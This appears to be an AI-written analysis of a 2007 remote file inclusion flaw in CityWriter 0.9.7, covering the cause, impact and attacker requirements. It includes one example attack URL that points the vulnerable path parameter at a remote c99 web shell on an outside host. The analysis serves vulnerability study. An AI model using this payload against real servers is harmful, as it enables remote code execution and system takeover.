Based on the provided content, here's a breakdown of the vulnerability:

**Root Cause:**

*   The vulnerability lies in the `head.php` file of CityWriter 0.9.7. Specifically, line 1 of this file contains the following code: `<? include($path."topbar.php"); ?>`.
*   The `$path` variable is not properly sanitized, allowing an attacker to inject an external URL through the `path` parameter in the HTTP request.

**Weaknesses/Vulnerabilities Present:**

*   **Remote File Inclusion (RFI):** The primary vulnerability is RFI.  The `include()` function in PHP attempts to load and execute the file specified by the `$path` variable.  Because the `$path` variable is controllable by the attacker, they can provide a remote file path and have the web server include it in the execution.

**Impact of Exploitation:**

*   **Arbitrary Code Execution:** By including a malicious PHP file from a remote server, an attacker can execute arbitrary code on the vulnerable web server.
*   **Full System Compromise:** If the attacker can execute arbitrary code on the web server, they could potentially gain full control of the system, leading to data theft, malware installation, or further attacks.

**Attack Vectors:**

*   **HTTP GET Request:** The attacker injects a malicious URL into the `path` parameter of an HTTP GET request targeting the `head.php` file.
*   **Example:** `www.RxH.com/citywriter/head.php?path=http://www.no-hack.fr/shells/c99.txt?`

**Required Attacker Capabilities/Position:**

*   **Network Access:** The attacker needs to be able to send HTTP requests to the vulnerable server.
*   **Knowledge of Vulnerable File:** The attacker must know the location of the vulnerable `head.php` file and the vulnerable `path` parameter.
*   **Remote Server Control:** The attacker needs to control a web server where they have a malicious PHP file, such as `c99.txt`.

**Additional Details:**

* The exploit is specifically for CityWriter version 0.9.7
* The exploit was published on 2007-12-13
* The exploit uses the path parameter on head.php
* The provided example includes the injection of a c99 shell.
